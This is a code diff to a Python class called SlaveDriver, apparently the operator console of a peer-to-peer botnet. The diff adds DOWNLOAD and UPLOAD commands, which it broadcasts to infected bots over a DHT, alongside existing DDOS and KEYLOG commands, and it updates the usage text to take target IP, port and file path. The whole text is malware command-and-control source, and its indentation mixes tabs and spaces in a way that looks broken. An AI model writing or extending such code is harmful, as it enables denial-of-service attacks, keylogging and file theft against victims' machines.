@@ -58,6 +58,17 @@ class SlaveDriver(basic.LineReceiver):
                 self.transport.write(output)
                 #actually send commands out on DHT to bot. Val is the bot's individual location it checks for commands
                 self.kserver.set(val,line)
+        if cmd == 'DOWNLOAD':
+        	for key,val in self.slaves.iteritems():
+        		output = 'Starting DOWNLOAD for bot {0}\n'.format(key)
+                self.transport.write(output)
+                self.kserver.set(val,line)
+        if cmd == 'UPLOAD':
+        	for key,val in self.slaves.iteritems():
+        		output = 'Starting UPLOAD for bot {0}\n'.format(key)
+                self.transport.write(output)
+                self.kserver.set(val,line)
+
 
 
     #this is called on the initial startup as part of the LineReceiver class
@@ -70,14 +81,14 @@ class SlaveDriver(basic.LineReceiver):
         self.transport.write('>>> ')
 
     def handlecmd(self, line):
-    	commands = ['DDOS','DOWNLOAD','KEYLOG']
+    	commands = ['DDOS','DOWNLOAD', 'UPLOAD' ,'KEYLOG']
     	#parse out actual command
     	tmp = line.split(' ')
     	cmd = tmp[0].upper()
     	if cmd not in commands:
     		#output to input
     		self.transport.write('Invalid Command\n')
-    		self.transport.write('Valid commands are: DDOS [ip], DOWNLOAD [ip], KEYLOG\n')
+    		self.transport.write('Valid commands are: DDOS [ip], DOWNLOAD [ip] [port] [filepath], UPLOAD [ip] [port] [filepath], KEYLOG\n')
     	else:
             self.parsecommands(line) #pass line for instructions that have more than one argument
 
